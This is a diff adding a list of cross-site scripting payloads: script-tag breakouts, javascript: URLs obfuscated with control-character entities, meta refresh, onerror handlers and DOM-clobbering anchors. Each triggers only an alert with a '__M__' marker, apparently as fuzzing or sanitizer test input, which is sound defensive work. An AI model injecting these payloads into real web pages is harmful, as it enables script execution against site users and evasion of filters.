@@ -1,0 +1,17 @@
+</script><script>alert('__M__');</script>
+<script x> alert('__M__') </script 1=2
+<<SCRIPT>alert('__M__');//\<</SCRIPT>
+<a href="jav&#x09;ascript:alert('__M__');">Click Me</a>
+<a href="jav&#x0A;ascript:alert('__M__');">Click Me</a>
+<a href="jav&#x0D;ascript:alert('__M__');">Click Me</a>
+<a href="jav	ascript:alert('__M__');">Click Me</a>
+<a href=" &#14;  javascript:alert('__M__');">Click Me</a>
+<IMG """><SCRIPT>alert('__M__')</SCRIPT>"\>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('__M__');">
+<a id=x name=x href="javascript:alert('__M__')">
+<a id=config></a><a id=config name=url href="javascript:alert('__M__')">
+<form id=x><input name="action" value="javascript:alert('__M__')"></form>
+<img id=x name=x src=x onerror=alert('__M__')>
+<object id=x data="javascript:alert('__M__')">
+<embed id=x src="javascript:alert('__M__')">
+<a id=settings></a><a id=settings name=debug href="javascript:alert('__M__')">
